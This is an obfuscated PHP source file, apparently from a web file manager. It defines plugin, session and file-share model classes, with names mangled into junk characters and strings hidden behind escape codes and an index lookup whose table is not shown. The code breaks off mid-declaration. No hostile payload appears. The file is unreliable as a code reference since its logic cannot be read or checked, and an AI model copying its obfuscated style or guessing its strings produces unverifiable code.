<?php
 goto D‹ƒÈìÆóÂ; AÛ£Æ®øßÂ: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\x70\154\x75\x67\x69\x6e\114\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\163\164\x61\x74\165\163", "\x72\145\147\151\145\163\164", "\143\157\156\146\x69\147"); public function loadList($¤©¼„¼Š = false) { $‹Æ´…Ö = array_to_keyvalue($this->listData(), $_SERVER[¤·²È‰º][42]); if ($¤©¼„¼Š) { return $‹Æ´…Ö[$¤©¼„¼Š]; } return $‹Æ´…Ö; } public function init() { $Š‹ßßÃ• =& $_SERVER[¤·²È‰º]; Hook::trigger($Š‹ßßÃ•[1943]); $Óòœ¸± = $this->loadPluginList(); foreach ($Óòœ¸± as $ÔÙôõƒ => $ã´­­Ï) { $Ñ¯®÷àì = $this->appAllow($ÔÙôõƒ, $ã´­­Ï); if (!$Ñ¯®÷àì) { continue; } foreach ($ã´­­Ï[$Š‹ßßÃ•[1944]] as $©¬ŠÕÑé => $Êá±ø’Í) { Hook::bind($©¬ŠÕÑé, $Êá±ø’Í); } } Hook::trigger($Š‹ßßÃ•[1945]); Hook::trigger(ACTION); } public function appAllow($ µ¨ÆµĞ, $¢´áçß¼, $í÷¾»½… = true) { $¡œ°šä =& $_SERVER[¤·²È‰º]; $åÑ‰²²ı = PLUGIN_DIR . $ µ¨ÆµĞ . $¡œ°šä[1946]; if (!is_array($¢´áçß¼) || !is_array($¢´áçß¼[$¡œ°šä[1944]]) || $¢´áçß¼[$¡œ°šä[751]] != 1 || !is_file($åÑ‰²²ı)) { return !1; } if ($GLOBALS[$¡œ°šä[511]] == 1) { if ($GLOBALS[$¡œ°šä[6]][$¡œ°šä[1947]] || !$GLOBALS[$¡œ°šä[6]][$¡œ°šä[1948]]) { return !0; } $»µë‹¨• = explode($¡œ°šä[60], strtolower($GLOBALS[$¡œ°šä[6]][$¡œ°šä[1948]])); return in_array(strtolower($ µ¨ÆµĞ), $»µë‹¨•) ? !1 : !0; } if ($í÷¾»½… && !Action($¡œ°šä[1949])->checkAuth($ µ¨ÆµĞ)) { return !1; } return !0; } public function unInstall($ÇÄå†Õ) { $›¶±Íå  =& $_SERVER[¤·²È‰º]; $€²áÏøÍ = $this->loadList($ÇÄå†Õ); if (file_exists(PLUGIN_DIR . $ÇÄå†Õ)) { Hook::apply($ÇÄå†Õ . $›¶±Íå [1950]); } $this->remove($€²áÏøÍ[$›¶±Íå [407]]); } public function changeStatus($™ÕÏ˜ğ‰, $‹±§µßí) { $°ÜÆáÜ =& $_SERVER[¤·²È‰º]; $»‚îı¤å = $this->loadList($™ÕÏ˜ğ‰); if ($‹±§µßí) { Hook::apply($™ÕÏ˜ğ‰ . $°ÜÆáÜ[1951]); } $this->update($»‚îı¤å[$°ÜÆáÜ[407]], array($°ÜÆáÜ[1952] => $‹±§µßí)); } public function appRegist($Öü€Õ³ı, $ò÷Ô¿Üë) { $í„çÌìÙ =& $_SERVER[¤·²È‰º]; $™ùé±á‚ = $this->loadList($Öü€Õ³ı); if ($™ùé±á‚) { $this->update($™ùé±á‚[$í„çÌìÙ[407]], array($í„çÌìÙ[1944] => $ò÷Ô¿Üë)); } else { $™äÔÄ‡Ğ = array($í„çÌìÙ[42] => $Öü€Õ³ı, $í„çÌìÙ[1944] => $ò÷Ô¿Üë, $í„çÌìÙ[751] => 0, $í„çÌìÙ[6] => $this->getConfigDefault($Öü€Õ³ı)); $this->insert($™äÔÄ‡Ğ); } } public function getConfigDefault($İÃİ¢–Ü) { $‰èÜó¢‹ =& $_SERVER[¤·²È‰º]; $åšú²è° = array(); $âÖ™±İˆ = $this->getPackageJson($İÃİ¢–Ü); if (!$âÖ™±İˆ && is_array($âÖ™±İˆ[$‰èÜó¢‹[1953]])) { return $åšú²è°; } foreach ($âÖ™±İˆ[$‰èÜó¢‹[1953]] as $­¥õÅö“ => $ùáß²î–) { if (!isset($ùáß²î–[$‰èÜó¢‹[383]]) || isset($åšú²è°[$­¥õÅö“])) { continue; } $åšú²è°[$­¥õÅö“] = $ùáß²î–[$‰èÜó¢‹[383]]; } return $åšú²è°; } public function getPackageJson($¸­²µÕÇ) { return Hook::apply($¸­²µÕÇ . $_SERVER[¤·²È‰º][1954]); } public function getConfig($óÅ”†³©, $Ç“¶© = false) { $„úšÑ‡™ =& $_SERVER[¤·²È‰º]; $¹ŠË† = array(); $˜İ¦Œ¸† = $this->loadList($óÅ”†³©); if ($˜İ¦Œ¸† && is_array($˜İ¦Œ¸†[$„úšÑ‡™[6]])) { $¹ŠË† = $˜İ¦Œ¸†[$„úšÑ‡™[6]]; } if (!$¹ŠË† || $Ç“¶©) { $¹ŠË† = $this->getConfigDefault($óÅ”†³©); } return $¹ŠË†; } public function setConfig($Ü¦ƒÚË», $«ÁãúÛş = false) { $ÍÃÙ˜ú» =& $_SERVER[¤·²È‰º]; $ªÁíšòŸ = $this->loadList($Ü¦ƒÚË»); if (!$ªÁíšòŸ) { return !1; } $ÂëãÏ– = $ªÁíšòŸ[$ÍÃÙ˜ú»[6]]; if ($«ÁãúÛş == !1) { $ÂëãÏ– = array(); $«ÁãúÛş = $this->getConfigDefault($Ü¦ƒÚË»); } foreach ($«ÁãúÛş as $¼îÈŸÊ¡ => $‘ú ûÔı) { $ÂëãÏ–[$¼îÈŸÊ¡] = is_string($‘ú ûÔı) ? trim($‘ú ûÔı) : $‘ú ûÔı; } $this->update($ªÁíšòŸ[$ÍÃÙ˜ú»[407]], array($ÍÃÙ˜ú»[6] => $ÂëãÏ–)); } public function viewList() { $ÔÁ£Ú =& $_SERVER[¤·²È‰º]; $Ï ª•î = $this->loadList(); $this->pluginScan($Ï ª•î); $Ï ª•î = $this->loadPluginList(); $•‰»çÏ = array(); foreach ($Ï ª•î as $´¥Ñ‘Ê => $Ì†­Ïò) { unset($Ì†­Ïò[$ÔÁ£Ú[1944]], $Ì†­Ïò[$ÔÁ£Ú[6]]); $áüÒí¶Â = PLUGIN_DIR . $Ì†­Ïò[$ÔÁ£Ú[42]] . $ÔÁ£Ú[1946]; if (!is_file($áüÒí¶Â)) { continue; } $ÂåÄñœÓ = Hook::apply($Ì†­Ïò[$ÔÁ£Ú[42]] . $ÔÁ£Ú[1954]); if (is_array($ÂåÄñœÓ)) { $•‰»çÏ[$´¥Ñ‘Ê] = array_merge($Ì†­Ïò, $ÂåÄñœÓ); } } return $•‰»çÏ; } private function loadPluginList() { $òÅ×ÍÍ÷ =& $_SERVER[¤·²È‰º]; $Ó“ƒ©ğ = $this->loadList(); if (strtolower(MOD) == $òÅ×ÍÍ÷[1955]) { return $Ó“ƒ©ğ; } $¥÷Ëàñ‹ = Hook::trigger($òÅ×ÍÍ÷[1956], $Ó“ƒ©ğ); if ($Ó“ƒ©ğ && !$¥÷Ëàñ‹) { die; } return $¥÷Ëàñ‹ ? $¥÷Ëàñ‹ : $Ó“ƒ©ğ; } private function pluginScan($æ‡¯æ©Š) { $ÑŸÆ‘Ö =& $_SERVER[¤·²È‰º]; recursion_dir(PLUGIN_DIR, $×©‰ ’©, $äÜÊÌÌÜ, 0); foreach ($×©‰ ’© as $Ã•”í™â) { $‚ÃöÑ = get_path_this($Ã•”í™â); if (isset($æ‡¯æ©Š[$‚ÃöÑ]) || !file_exists($Ã•”í™â . $ÑŸÆ‘Ö[1957]) || !file_exists($Ã•”í™â . $ÑŸÆ‘Ö[1946])) { continue; } Hook::apply($‚ÃöÑ . $ÑŸÆ‘Ö[1951]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\x6d\137\163\145\x73\163\x69\x6f\156"; public function get($æí¢˜‡û) { $§èœ²Ó£ =& $_SERVER[¤·²È‰º]; $İ›Ş×­• = $this->where(array($§èœ²Ó£[1958] => $æí¢˜‡û))->find(); if (!is_array($İ›Ş×­•)) { return !1; } return $İ›Ş×­•[$§èœ²Ó£[756]]; } public function set($ûµÎõ¹û, $ôäŠ÷‡, $ÊËÎ–  = 3600) { $»Ìü¬­ì =& $_SERVER[¤·²È‰º]; $Á´»¿í = array($»Ìü¬­ì[1958] => $ûµÎõ¹û, $»Ìü¬­ì[1862] => $ôäŠ÷‡, $»Ìü¬­ì[1959] => $ÊËÎ–  + time()); if (Session::get($»Ìü¬­ì[1960])) { $Á´»¿í[$»Ìü¬­ì[1651]] = Session::get($»Ìü¬­ì[1960]); } else { $Á´»¿í[$»Ìü¬­ì[1651]] = 0; } if ($this->get($ûµÎõ¹û)) { return $this->where(array($»Ìü¬­ì[1958] => $ûµÎõ¹û))->save($Á´»¿í); } else { return $this->add($Á´»¿í, array(), !0); } } public function remove($‡‚°³”) { return $this->where(array($_SERVER[¤·²È‰º][1958] => $‡‚°³”))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¤·²È‰º][1961] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\x54\x69\x6d\145", "\x74\x69\155\145", "\x69\x6e\x73\x65\162\x74\54\165\x70\144\141\164\x65", "\146\x75\156\x63\164\151\x6f\156"), array("\x63\162\x65\141\164\x65\124\x69\x6d\x65", "\x74\151\155\x65", "\x69\156\163\145\162\x74", "\x66\x75\x6e\x63\x74\x69\157\x6e"), array("\x6f\160\x74\x69\x6f\156\x73", '', "\x69\x6e\x73\x65\162\x74\x2c\165\x70\144\x61\x74\x65\54\163\145\154\145\143\164", "\152\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($ÆÊÍğÁ–) { $ş·Š„˜Ú =& $_SERVER[¤·²È‰º]; $¦§³ßî¿ = isset($ÆÊÍğÁ–[0]) ? $ÆÊÍğÁ–[0] : !1; return array($ş·Š„˜Ú[1962] => array(USER_ID, $ş·Š„˜Ú[1963]), $ş·Š„˜Ú[1903] => array($¦§³ßî¿, $ş·Š„˜Ú[1964])); } protected function listSimple() { $À©¸Ÿì = array($_SERVER[¤·²È‰º][1651] => USER_ID); $©ïĞË–Ô = $this->field($this->fieldList)->where($À©¸Ÿì)->select(); return $©ïĞË–Ô ? $©ïĞË–Ô : array(); } protected function getInfo($Â¡»ûÏŸ, $ßÅ¨†ùş = false) { $ƒ»áŠøà =& $_SERVER[¤·²È‰º]; if ($ßÅ¨†ùş) { return $this->_getShareInfo(array($ƒ»áŠøà[497] => $Â¡»ûÏŸ)); } $‘ö²ÈŠ× = $this->cacheFunctionGet($ƒ»áŠøà[1905], $Â¡»ûÏŸ); return $‘ö²ÈŠ×; } public function getInfoByHash($ÖÒÍ¿ÜË) { return $this->_getShareInfo(array($_SERVER[¤·²È‰º][499] => $ÖÒÍ¿ÜË)); } public function getInfoByPath($²ôÓØ•Í) { $œüÓş¨ =& $_SERVER[¤·²È‰º]; $âòÉ©ŸÕ = array($œüÓş¨[1651] => USER_ID, $œüÓş¨[410] => $²ôÓØ•Í); return $this->_getShareInfo($âòÉ©ŸÕ); } public function getInfoBySourcePath($Ğö‘‡öÒ) { $¾Ã£·ˆ¬ =& $_SERVER[¤·²È‰º]; $á€•¡óÚ = array($¾Ã£·ˆ¬[1651] => USER_ID, $¾Ã£·ˆ¬[1170] => $Ğö‘‡öÒ); return $this->_getShareInfo($á€•¡óÚ); } private function _getShareInfo($ÇÃİú‡«) { $»Š„¥¹³ =& $_SERVER[¤·²È‰º]; $°Óª²«€ = $this->where($ÇÃİú‡«)->find(); if (!$°Óª²«€) { return !1; } $ÇÃİú‡« = array($»Š„¥¹³[497] => $°Óª²«€[$»Š„¥¹³[497]]); $ ©•€„ê = $»Š„¥¹³[1965]; $ÌËÙªªÍ = Model($»Š„¥¹³[610])->order($»Š„¥¹³[407])->field($ ©•€„ê)->where($ÇÃİú‡«)->select(); if ($°Óª²«€[$»Š„¥¹³[410]] == $»Š„¥¹³[207]) { $°Óª²«€[$»Š„¥¹³[96]] = IO::info($°Óª²«€[$»Š„¥¹³[1170]]); } else { $°Óª²«€[$»Š„¥¹³[96]] = Model($»Š„¥¹³[1321])->pathInfo($°Óª²«€[$»Š„¥¹³[410]]); } $°Óª²«€[$»Š„¥¹³[1966]] = $ÌËÙªªÍ; return $°Óª²«€; } protected function getInfoAuth($òÑƒõ«) { $Ûñì˜ =& $_SERVER[¤·²È‰º]; $é¡Â²Ã = $this->getInfo($òÑƒõ«); if ($é¡Â²Ã[$Ûñì˜[1651]] == USER_ID) { $é¡Â²Ã[$Ûñì˜[421]] = $é¡Â²Ã[$Ûñì˜[96]][$Ûñì˜[421]]; } else { $é¡Â²Ã[$Ûñì˜[421]] = Model($Ûñì˜[510])->authMake($é¡Â²Ã[$Ûñì˜[1966]]); } return $é¡Â²Ã; } protected function listData($Å„„İğº = null, $Ş¢şÛò = 300) { $æÁõº¢ =& $_SERVER[¤·²È‰º]; $ú‹ª–À = array(array($æÁõº¢[502] => array($æÁõº¢[1006], 0), $æÁõº¢[504] => array($æÁõº¢[1006], 0), $æÁõº¢[1967] => $æÁõº¢[1921])); if ($Å„„İğº == $æÁõº¢[1968]) { $ú‹ª–À = array($æÁõº¢[502] => 1); } else { if ($Å„„İğº == $æÁõº¢[1155]) { $ú‹ª–À = array($æÁõº¢[504] => 1); } } $ú‹ª–À[$æÁõº¢[1651]] = USER_ID; $™½àıòá = $this->where($ú‹ª–À)->selectPage($Ş¢şÛò); return $™½àıòá; } protected function listToMe($ã‡ºÏ = 300) { $ã¦¿Öôç =& $_SERVER[¤·²È‰º]; $§¯İÔÆç = Model($ã¦¿Öôç[1969])->userGroupParents(USER_ID); $ëŸ½é¢¯ = array($ã¦¿Öôç[594] => SourceModel::TYPE_USER, $ã¦¿Öôç[513] => USER_ID); if ($§¯İÔÆç) { $ëŸ½é¢¯ = array(array($ã¦¿Öôç[594] => SourceModel::TYPE_USER, $ã¦¿Öôç[513] => USER_ID), array($ã¦¿Öôç[594] => SourceModel::TYPE_GROUP, $ã¦¿Öôç[513] => array($ã¦¿Öôç[7], $§¯İÔÆç)), $ã¦¿Öôç[1967] => $ã¦¿Öôç[1921]); } $ì³Ê„şœ = Model($ã¦¿Öôç[610])->where($ëŸ½é¢¯)->selectPage($ã‡ºÏ); $ñ¥éÚû× = array_to_keyvalue_group($ì³Ê„şœ[$ã¦¿Öôç[378]], $ã¦¿Öôç[497]); if (!$ñ¥éÚû×) { return $ì³Ê„şœ; } $ÔÀ¡İ¢» = $ã¦¿Öôç[1970]; $ëŸ½é¢¯ = array($ã¦¿Öôç[497] => array($ã¦¿Öôç[426], array_keys($ñ¥éÚû×)), $ã¦¿Öôç[1651] => array($ã¦¿Öôç[1008], $ã¦¿Öôç[207])); $¸¹Â×€º = $this->field($ÔÀ¡İ¢»)->where($ëŸ½é¢¯)->select(); foreach ($¸¹Â×€º as $ÁâøÚ¹ö => &$µÂ÷Éï) { $µÂ÷Éï[$ã¦¿Öôç[1966]] = $ñ¥éÚû×[$µÂ÷Éï[$ã¦¿Öôç[497]]]; } unset($µÂ÷Éï); $ÍÕÜá³‰ = array($ã¦¿Öôç[1971] => $¸¹Â×€º, $ã¦¿Öôç[1972] => $ì³Ê„şœ[$ã¦¿Öôç[375]]); return $ÍÕÜá³‰; } protected function shareAdd($Íí¹Ã·Ó, $†¶ãÏÄ) { $»Ô£ÄÁ =& $_SERVER[¤·²È‰º]; $–›‘³ƒ£ = $this->_addShareData($Íí¹Ã·Ó, $†¶ãÏÄ); if (!empty($†¶ãÏÄ[$»Ô£ÄÁ[1973]])) { $this->_shareAuthSet($–›‘³ƒ£, $†¶ãÏÄ[$»Ô£ÄÁ[1973]]); } $this->shareEventAdd($Íí¹Ã·Ó, $†¶ãÏÄ, $»Ô£ÄÁ[1158]); return $–›‘³ƒ£; } protected function shareAddSystem($Ó¥Ó®Ø¨, $ëïÕÖê) { $ÒËŒÔ‡ =& $_SERVER[¤·²È‰º]; $Òğşïó² = $this->_addShareData($Ó¥Ó®Ø¨, $ëïÕÖê, $ÒËŒÔ‡[1270]); $this->_shareAuthSet($Òğşïó², $ëïÕÖê[$ÒËŒÔ‡[1973]]); return $Òğşïó²; } private function shareEventAdd($£««àÅÒ, $´Ÿ—®Ç, $™şõ¿‹ = "\x61\144\144") { $¨ÂüìÖš =& $_SERVER[¤·²È‰º]; if (!$£««àÅÒ || $£««àÅÒ == $¨ÂüìÖš[207]) { return; } if ($™şõ¿‹ == $¨ÂüìÖš[1158]) { if ($´Ÿ—®Ç[$¨ÂüìÖš[502]] == $¨ÂüìÖš[98]) { Model($¨ÂüìÖš[578])->eventShare($£««àÅÒ, $¨ÂüìÖš[1974]); } if ($´Ÿ—®Ç[$¨ÂüìÖš[504]] == $¨ÂüìÖš[98]) { Model($¨ÂüìÖš[578])->eventShare($£««àÅÒ, $¨ÂüìÖš[1975]); } return; } $â”ÏµÅ = $this->getInfoByPath($£««àÅÒ); $Ğ­Í×…… = $¨ÂüìÖš[1976]; if ($â”ÏµÅ[$¨ÂüìÖš[502]] == $¨ÂüìÖš[207] && $´Ÿ—®Ç[$¨ÂüìÖš[502]] == $¨ÂüìÖš[98]) { $Ğ­Í×…… = $¨ÂüìÖš[1974]; } if ($â”ÏµÅ[$¨ÂüìÖš[502]] == $¨ÂüìÖš[98] && $´Ÿ—®Ç[$¨ÂüìÖš[502]] == $¨ÂüìÖš[207]) { $Ğ­Í×…… = $¨ÂüìÖš[1977]; } if ($â”ÏµÅ[$¨ÂüìÖš[504]] == $¨ÂüìÖš[207] && $´Ÿ—®Ç[$¨ÂüìÖš[504]] == $¨ÂüìÖš[98]) { $Ğ­Í×…… = $¨ÂüìÖš[1975]; } if ($â”ÏµÅ[$¨ÂüìÖš[504]] == $¨ÂüìÖš[98] && $´Ÿ—®Ç[$¨ÂüìÖš[504]] == $¨ÂüìÖš[207]) { $Ğ­Í×…… = $¨ÂüìÖš[1978]; } Model($¨ÂüìÖš[578])->eventShare($£««àÅÒ, $Ğ­Í×……); return; } private function _addShareData($æ·–ÇÚë, $»šĞçöÛ = array(), $¼Ê½“Úú = false) { $”ËØäÖ =& $_SERVER[¤·²È‰º]; $éØôã·± = $¼Ê½“Úú == $”ËØäÖ[1270] ? 0 : USER_ID; $¦ÙËÀ·˜ = array($”ËØäÖ[425] => $æ·–ÇÚë, $”ËØäÖ[1642] => $éØôã·±); if ($æ·–ÇÚë == 0) { $¦ÙËÀ·˜ = array($”ËØäÖ[1979] => $»šĞçöÛ[$”ËØäÖ[1170]], $”ËØäÖ[1642] => $éØôã·±); } if ($¦ú»¦ = $this->where($¦ÙËÀ·˜)->find()) { return $¦ú»¦[$”ËØäÖ[497]]; } if ($æ·–ÇÚë == 0) { $õ••…Şš = array($”ËØäÖ[42] => get_path_this($»šĞçöÛ[$”ËØäÖ[94]])); } else { $õ••…Şš = Model($”ËØäÖ[826])->sourceInfo($æ·–ÇÚë); if (!$õ••…Şš) { return !1; } } if (!$»šĞçöÛ[$”ËØäÖ[1550]]) { $»šĞçöÛ[$”ËØäÖ[1550]] = $õ••…Şš[$”ËØäÖ[42]]; } $ÔÕÂß‰ = array($”ËØäÖ[1642] => $éØôã·±, $”ËØäÖ[425] => $æ·–ÇÚë, $”ËØäÖ[1550] => $”ËØäÖ[12], $”ËØäÖ[502] => 0, $”ËØäÖ[504] => 0, $”ËØäÖ[1170] => $”ËØäÖ[12], $”ËØäÖ[316] => $”ËØäÖ[12], $”ËØäÖ[883] => $”ËØäÖ[12], $”ËØäÖ[1980] => 0, $”ËØäÖ[1981] => 0, $”ËØäÖ[505] => 0, $”ËØäÖ[506] => $”ËØäÖ[12], $”ËØäÖ[499] => $”ËØäÖ[12]); $“ç‚İ = explode($”ËØäÖ[60], $”ËØäÖ[1982]); foreach ($“ç‚İ as $Šãåâ†Ë) { if (!isset($»šĞçöÛ[$Šãåâ†Ë])) { continue; } $ÔÕÂß‰[$Šãåâ†Ë] = $»šĞçöÛ[$Šãåâ†Ë]; } $î„¶Íê = $this->add($ÔÕÂß‰); $±ŞĞ¸èı = array($”ËØäÖ[499] => short_id($î„¶Íê)); $this->where(array($”ËØäÖ[496] => $î„¶Íê))->save($±ŞĞ¸èı); return $î„¶Íê; } private function _shareAuthSet($ÔäÉä¥Ï, $Ş™–âÒú) { $õş·àßƒ =& $_SERVER[¤·²È‰º]; if (!is_array($Ş™–âÒú)) { return !1; } $™§““ğÆ = Model($õş·àßƒ[1931]); $™§““ğÆ->where(array($õş·àßƒ[497] => $ÔäÉä¥Ï))->delete(); $¿¨ Èö = array(); foreach ($Ş™–âÒú as $Üäª½ÉÚ) { $Õ¾®Û†ö = SourceModel::TYPE_USER; if ($Üäª½ÉÚ[$õş·àßƒ[419]] == SourceModel::TYPE_GROUP) { $Õ¾®Û†ö = SourceModel::TYPE_GROUP; } $ËÀìÅ¡Â = array($õş·àßƒ[497] => $ÔäÉä¥Ï, $õş·àßƒ[419] => $Õ¾®Û†ö, $õş·àßƒ[513] => intval($Üäª½ÉÚ[$õş·àßƒ[513]]), $õş·àßƒ[1927] => 0, $õş·àßƒ[1983] => -1); if ($Üäª½ÉÚ[$õş·àßƒ[1927]]) { $ËÀìÅ¡Â[$õş·àßƒ[1927]] = $Üäª½ÉÚ[$õş·àßƒ[1927]]; } else { if ($Üäª½ÉÚ[$õş·àßƒ[1983]]) { $ËÀìÅ¡Â[$õş·àßƒ[1983]] = $Üäª½ÉÚ[$õş·àßƒ[1983]]; } } $¿¨ Èö[] = $ËÀìÅ¡Â; } return $™§““ğÆ->addAll($¿¨ Èö, array(), !0); } public function numViewAdd($ÃÊ•—ŠĞ) { $Û¯ÁÇ¯Å =& $_SERVER[¤·²È‰º]; $°ƒˆ° = array($Û¯ÁÇ¯Å[496] => $ÃÊ•—ŠĞ); $this->where($°ƒˆ°)->setAdd($Û¯ÁÇ¯Å[1980]); } public function numDownloadAdd($‰¹óêğ) { $ÕˆÖ¢à¾ =& $_SERVER[¤·²È‰º]; $†µÎ‘ÌÉ = array($ÕˆÖ¢à¾[496] => $‰¹óêğ); $this->where($†µÎ‘ÌÉ)->setAdd($ÕˆÖ¢à¾[1981]); } protected function shareEdit($×Å›ŒÍÆ, $šœÁœÜ) { $ü€Œ‡Ÿ¸ =& $_SERVER[¤·²È‰º]; $½®½¢Œ = $this->getInfo($×Å›ŒÍÆ); if (!$½®½¢Œ) { return !1; } $this->_checkLinkShare($šœÁœÜ, $½®½¢Œ); $»É‡¬÷ú = array(); $¢ÊĞ‚œ» = explode($ü€Œ‡Ÿ¸[60], $ü€Œ‡Ÿ¸[1984]); foreach ($¢ÊĞ‚œ» as $şßŠİÖ­) { if (!array_key_exists($şßŠİÖ­, $šœÁœÜ)) { continue; } $»É‡¬÷ú[$şßŠİÖ­] = $šœÁœÜ[$şßŠİÖ­]; } $this->shareEventAdd($½®½¢Œ[$ü€Œ‡Ÿ¸[410]], $šœÁœÜ, $ü€Œ‡Ÿ¸[1793]); $this->where(array($ü€Œ‡Ÿ¸[496] => $×Å›ŒÍÆ))->save($»É‡¬÷ú); if (isset($šœÁœÜ[$ü€Œ‡Ÿ¸[1973]])) { $this->_shareAuthSet($×Å›ŒÍÆ, $šœÁœÜ[$ü€Œ‡Ÿ¸[1973]]); } return !0; } private function _checkLinkShare($ÆƒÙæ¾, $–ªĞ¿ä‚) { $Á¢ƒ¬× =& $_SERVER[¤·²È‰º]; if ($ÆƒÙæ¾[$Á¢ƒ¬×[502]] != $Á¢ƒ¬×[98]) { return; } $Ô°­òª« = $–ªĞ¿ä‚[$Á¢ƒ¬×[96]][$Á¢ƒ¬×[410]]; if ($–ªĞ¿ä‚[$Á¢ƒ¬×[96]][$Á¢ƒ¬×[43]] != $Á¢ƒ¬×[209]) { $¥øóÎ² = $this->_folderReport($Ô°­òª«); if (!$¥øóÎ²) { return; } show_json(LNG($Á¢ƒ¬×[1985]) . $Á¢ƒ¬×[1986] . $¥øóÎ², !1); } $½¡ùôÉå = Model($Á¢ƒ¬×[826])->fileInfoGet($–ªĞ¿ä‚[$Á¢ƒ¬×[96]][$Á¢ƒ¬×[410]]); if (!$½¡ùôÉå) { return; } $…²ùã§ä = $this->shareFileMeta($½¡ùôÉå[$Á¢ƒ¬×[476]]); if (isset($…²ùã§ä[$Á¢ƒ¬×[383]]) && $…²ùã§ä[$Á¢ƒ¬×[383]] == $Á¢ƒ¬×[98]) { show_json(LNG($Á¢ƒ¬×[1987]), !1); } } private function _folderReport($»ÛÈä±ş) { $ûĞ´Ú·ù =& $_SERVER[¤·²È‰º]; $£İ„Š¢Ï = array($ûĞ´Ú·ù[476] => array($ûĞ´Ú·ù[1006], 0), $ûĞ´Ú·ù[751] => 3); $˜¬—¿Åª = Model($ûĞ´Ú·ù[1988])->where($£İ„Š¢Ï)->field($ûĞ´Ú·ù[476])->select(); if (!$˜¬—¿Åª) { return !1; } $˜¬—¿Åª = array_to_keyvalue($˜¬—¿Åª, $ûĞ´Ú·ù[12], $ûĞ´Ú·ù[476]); $¨Şàş÷ö = $ûĞ´Ú·ù[60] . $»ÛÈä±ş . $ûĞ´Ú·ù[60]; $£İ„Š¢Ï = array($ûĞ´Ú·ù[476] => array($ûĞ´Ú·ù[7], $˜¬—¿Åª), $ûĞ´Ú·ù[529] => array($ûĞ´Ú·ù[391], "\x25{$¨Şàş÷ö}\x25"), $ûĞ´Ú·ù[439] => 0); $Êöæ Å = Model($ûĞ´Ú·ù[826])->where($£İ„Š¢Ï)->field($ûĞ´Ú·ù[1989])->find(); if (!$Êöæ Å) { return !1; } $¶ôÓÅû = substr($Êöæ Å[$ûĞ´Ú·ù[529]], strpos($Êöæ Å[$ûĞ´Ú·ù[529]], $¨Şàş÷ö)); $£İ„Š¢Ï = array($ûĞ´Ú·ù[410] => array($ûĞ´Ú·ù[7], trim($¶ôÓÅû, $ûĞ´Ú·ù[60]))); $¾Äîí— = Model($ûĞ´Ú·ù[826])->where($£İ„Š¢Ï)->field($ûĞ´Ú·ù[42])->select(); $ê ı±Œ = array_to_keyvalue($¾Äîí—, $ûĞ´Ú·ù[12], $ûĞ´Ú·ù[42]); $ê ı±Œ[] = $Êöæ Å[$ûĞ´Ú·ù[42]]; return implode($ûĞ´Ú·ù[8], $ê ı±Œ); } protected function remove($œµûÈïÁ) { $ÂÎ‰Í› =& $_SERVER[¤·²È‰º]; if (is_array($œµûÈïÁ)) { $œµûÈïÁ = array($ÂÎ‰Í›[7], $œµûÈïÁ); } $æÖ®«Ï· = array($ÂÎ‰Í›[497] => $œµûÈïÁ); $˜á²õ÷ê = $this->where($æÖ®«Ï·)->delete(); if ($˜á²õ÷ê) { Model($ÂÎ‰Í›[610])->where(array($ÂÎ‰Í›[497] => $œµûÈïÁ))->delete(); } $² ÷÷à— = is_array($œµûÈïÁ) ? $œµûÈïÁ[1] : array($œµûÈïÁ); for ($­è´¼òû = 0; $­è´¼òû < count($² ÷÷à—); $­è´¼òû++) { $ÃÛ÷¸Üñ = $this->getInfo($² ÷÷à—[$­è´¼òû]); if ($ÃÛ÷¸Üñ[$ÂÎ‰Í›[504]] == $ÂÎ‰Í›[98]) { Model($ÂÎ‰Í›[578])->eventShare($ÃÛ÷¸Üñ[$ÂÎ‰Í›[410]], $ÂÎ‰Í›[1978]); } if ($ÃÛ÷¸Üñ[$ÂÎ‰Í›[502]] == $ÂÎ‰Í›[98]) { Model($ÂÎ‰Í›[578])->eventShare($ÃÛ÷¸Üñ[$ÂÎ‰Í›[410]], $ÂÎ‰Í›[1977]); } } return $˜á²õ÷ê; } protected function removeBySource($ÔµĞÉÎˆ) { $øÇ°•“ =& $_SERVER[¤·²È‰º]; $ûˆï«»Õ = array($øÇ°•“[425] => array($øÇ°•“[426], $ÔµĞÉÎˆ)); $º°øš¼× = $this->field($øÇ°•“[497])->where($ûˆï«»Õ)->select(); $º°øš¼× = array_to_keyvalue($º°øš¼×, $øÇ°•“[12], $øÇ°•“[497]); if (!$º°øš¼×) { return; } $ûˆï«»Õ = array($øÇ°•“[496] => array($øÇ°•“[426], $º°øš¼×)); $this->where($ûˆï«»Õ)->delete(); Model($øÇ°•“[610])->where($ûˆï«»Õ)->delete(); } public function listAll($œ²Ø–§Ù) { $šùè¤º¸ =& $_SERVER[¤·²È‰º]; $ßıèê× = array(); if ($œ²Ø–§Ù[$šùè¤º¸[1651]]) { $ßıèê×[$šùè¤º¸[1651]] = $œ²Ø–§Ù[$šùè¤º¸[1651]]; } if ($œ²Ø–§Ù[$šùè¤º¸[762]]) { $¿Ê¬şêÉ = $œ²Ø–§Ù[$šùè¤º¸[505]] ? $œ²Ø–§Ù[$šùè¤º¸[505]] : strtotime(date($šùè¤º¸[1990])); $ßıèê×[$šùè¤º¸[210]] = array($šùè¤º¸[342], array($œ²Ø–§Ù[$šùè¤º¸[762]], $¿Ê¬şêÉ)); } if ($œ²Ø–§Ù[$šùè¤º¸[43]]) { $ßıèê×[$œ²Ø–§Ù[$šùè¤º¸[43]]] = 1; } else { $ßıèê×[] = array($šùè¤º¸[502] => array($šùè¤º¸[1006], 0), $šùè¤º¸[504] => array($šùè¤º¸[1006], 0), $šùè¤º¸[1967] => $šùè¤º¸[1921]); } if ($œ²Ø–§Ù[$šùè¤º¸[1917]]) { $ßıèê×[] = array($šùè¤º¸[499] => $œ²Ø–§Ù[$šùè¤º¸[1917]], $šùè¤º¸[1550] => array($šùè¤º¸[391], "\x25{$œ²Ø–§Ù[$šùè¤º¸[1917]]}\x25"), $šùè¤º¸[1967] => $šùè¤º¸[1921]); } $±ôãÎ¾Œ = $this->_makeOrder()->where($ßıèê×)->selectPage(20); if (empty($±ôãÎ¾Œ[$šùè¤º¸[378]])) { return array(); } $this->_listDataApply($±ôãÎ¾Œ[$šùè¤º¸[378]]); return $±ôãÎ¾Œ; } public function 